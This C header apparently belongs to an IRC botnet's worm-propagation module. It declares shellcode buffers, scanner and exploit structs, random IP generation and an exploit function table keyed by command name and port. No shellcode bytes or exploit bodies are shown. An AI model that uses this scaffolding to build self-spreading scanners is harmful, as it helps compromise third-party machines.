#ifndef NO_ADVSCAN
#define MAX_COMMANDLEN 15

extern unsigned char szShellCode[];
extern unsigned char szPage[];

extern int iShellSize;
extern int iPageSize;

typedef struct ADVSCAN 
{
	char ip[16];
	char target[128];
	unsigned int port;
	unsigned int delay;
	unsigned int minutes;
	unsigned int threadnum;
	unsigned int cthreadnum;
	unsigned int cthreadid;
	unsigned int threads;
	int exploit;
	BOOL silent;
	BOOL verbose;
	BOOL random;
	BOOL gotinfo;
	BOOL cgotinfo;
	void *conn;
} ADVSCAN;

typedef struct ADVINFO 
{
	unsigned long ip;
	BOOL info;
} ADVINFO;

typedef struct EXINFO 
{
	char ip[16];
	char chan[128];
	int share;
	char command[MAX_COMMANDLEN];
	unsigned int port;
	unsigned int threadnum;
	int exploit;
	BOOL option;
	BOOL notice;
	BOOL silent;
	BOOL verbose;
	BOOL gotinfo;
} EXINFO;

typedef struct SCANALL 
{
	char command[MAX_COMMANDLEN];
	bool isend;
} SCANALL;

typedef BOOL (*efref)(char *target, void* conn,EXINFO exinfo);

typedef struct EXPLOIT 
{
	char command[MAX_COMMANDLEN];
	unsigned int port;
	efref exfunc;
} EXPLOIT;

void CurrentIP(void *conn, char *target, int threadnum);
DWORD WINAPI AdvPortScanner(LPVOID param);
DWORD WINAPI AdvScanner(LPVOID param);
BOOL AdvPortOpen(unsigned long ip, unsigned int port, unsigned int delay);
char *MakeIP(char *ip,BOOL Random,int Class);
#endif
